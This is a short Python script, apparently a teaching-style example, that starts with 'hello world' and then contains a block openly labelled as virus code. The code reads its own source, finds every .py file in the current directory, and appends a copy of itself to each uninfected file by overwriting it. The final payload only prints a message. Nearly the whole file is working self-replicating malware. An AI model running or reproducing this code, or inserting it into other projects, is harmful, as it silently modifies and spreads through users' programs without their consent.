print("hello world")

# starting virus code
import sys
import re
import glob

# put a copy of all these lines into a list
virusCode = []

thisFile = sys.argv[0]
print(f"This file: {thisFile}")
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# save the lines into a list to use later
inVirus = False
for line in lines:
    if re.search("^# starting virus code", line):
        inVirus = True

    if inVirus:
        virusCode.append(line)
    if re.search("^# end of virus code", line):
        break

# find potential victims
programs = glob.glob("*.py")
print("Programs found:", programs)

# check and infect all programs that glob found
for p in programs:
    if p == thisFile:
        print(f"Skipping self: {p}")
        continue  # Skip the virus file itself

    file = open(p, "r")
    programCode = file.readlines()
    file.close()

    # check to see if the file is already infected
    infected = False
    for line in programCode:
        if re.search("^# starting virus code", line):
            infected = True
            break

    print(f"File: {p}, Already infected: {infected}")
    if not infected:
        # Append the virus code to the current program's code
        programCode.extend(virusCode)

        # write the new version of the file. overwrite the original
        file = open(p, "w")
        file.writelines(programCode)
        file.close()
        print(f"Infected: {p}")

# payload do your evil work
print("This file is infected")
# end virus code
